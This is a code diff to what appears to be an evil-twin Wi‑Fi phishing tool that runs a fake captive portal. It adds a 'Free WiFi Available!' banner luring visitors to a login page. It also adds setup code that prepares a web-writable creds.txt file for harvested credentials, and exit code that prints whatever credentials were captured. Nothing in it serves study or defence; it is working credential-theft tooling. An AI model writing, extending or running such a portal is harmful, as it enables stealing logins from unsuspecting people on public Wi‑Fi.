@@ -269,6 +269,23 @@ log-dhcp
         # Reset IP
         subprocess.run(["ifconfig", PHY_INTERFACE, "down"])
         subprocess.run(["ifconfig", PHY_INTERFACE, "up"])
+
+        # Display captured credentials summary
+        if os.path.exists("/var/www/html/creds.txt"):
+            print("\n[*] Captured credentials saved to: /var/www/html/creds.txt")
+            try:
+                with open("/var/www/html/creds.txt", "r") as f:
+                    content = f.read()
+                    if content.strip():
+                        print("[+] Credentials captured:")
+                        print("="*60)
+                        print(content)
+                        print("="*60)
+                    else:
+                        print("[-] No credentials were captured")
+            except Exception as e:
+                print(f"[!] Could not read credentials file: {e}")
+
         print("[+] Done.")
 
     #Capture portal/ phishing part
@@ -520,6 +537,16 @@ log-dhcp
             <span class="w3-text-white">15 Adr street, 5015</span>
         </div>
     </header>
+
+    <!-- WiFi Access Notice Banner -->
+    <div class="w3-container w3-amber w3-padding" style="position: sticky; top: 52px; z-index: 999;">
+        <div class="w3-content" style="max-width:700px">
+            <p class="w3-center" style="margin: 8px 0;">
+                <strong>📶 Free WiFi Available!</strong><br>
+                <span style="font-size: 0.9em;">To access the internet or place online orders, please <a href="javascript:void(0)" onclick="openLogin()" style="text-decoration: underline; color: #000; font-weight: bold;">login to our service portal</a>.</span>
+            </p>
+        </div>
+    </div>
 
     <!-- Add a background color and large text to the whole page -->
     <div class="w3-sand w3-grayscale w3-large">
@@ -817,7 +844,16 @@ log-dhcp
     
     subprocess.run(["chmod", "-R", "755", "/var/www/html"])
     subprocess.run(["chown", "-R", "www-data:www-data", "/var/www/html"])
-    
+
+    # Create/clear credentials file with proper permissions
+    print("[*] Creating credentials file...")
+    # Clear any existing credentials from previous runs
+    with open("/var/www/html/creds.txt", "w") as f:
+        f.write("")  # Empty file
+    subprocess.run(["chown", "www-data:www-data", "/var/www/html/creds.txt"])
+    subprocess.run(["chmod", "664", "/var/www/html/creds.txt"])
+    print("[+] Credentials file cleared and ready: /var/www/html/creds.txt")
+
     print("[+] Capture portal pages created")
     #subprocess.run(["systemctl", "start", "lighttpd"], 
     #               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
